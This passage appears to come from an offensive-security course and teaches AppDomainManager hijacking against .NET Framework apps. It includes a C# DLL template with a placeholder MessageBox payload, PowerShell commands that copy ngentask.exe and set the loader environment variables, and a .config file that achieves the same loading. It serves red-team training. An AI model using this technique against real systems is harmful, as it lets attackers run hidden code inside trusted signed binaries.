
There are also methods of forcing .NET applications into loading DLLs regardless of the search order.  [Startup hooks](https://rastamouse.me/net-startup-hooks/) can be utilised for apps written in .NET Core 3.1 or higher.  Here, I'll demonstrate how to use a custom [AppDomainManager](https://learn.microsoft.com/en-us/dotnet/api/system.appdomainmanager?view=netframework-4.8.1), which works for apps written in .NET Framework.  This requires us to write a class that inherits from _AppDomainManager_, and compile it to a .NET DLL.  The malicious code can go in the class constructor or one of the virtual methods that you can override.

```c#
using System;
using System.Windows.Forms;

namespace AppDomainHijack;

public sealed class DomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        MessageBox.Show("Hello World", "Success");
    }
}
```

This DLL needs to be in the same directory as the .NET app that we want to have it loaded into.  There are over 100 .NET assemblies installed by default on a Windows system, including NGenTask used in the previous example, which we can just copy into the current directory.

```powershell
PS C:\Users\Attacker> cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe ngentask.exe

PS C:\Users\Attacker> cp C:\Tools\AppDomainHijack\bin\Debug\AppDomainHijack.dll domainManager.dll
```

There are two ways to have the app load the DLL.  The first is via two environment variables called `APPDOMAIN_MANAGER_ASM` and `APPDOMAIN_MANAGER_TYPE`.

```powershell
PS C:\Users\Attacker>$env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
PS C:\Users\Attacker>$env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
```

>The type and assembly names must be fully qualified.

Once the variables are in place, executing the application will cause it to load the DLL.

![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/e8159f4a8e71f91ce5aaf6cf2a30aa92.png)

The other method is to use the `appDomainManagerAssembly` and `appDomainManagerType` elements in a `.config` file.  The filename must be prefixed with the application name, e.g. `ngentask.exe.config`.

```xml
<configuration>
   <runtime>
      <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />  
      <appDomainManagerType value="AppDomainHijack.DomainManager" />  
   </runtime>
</configuration>
```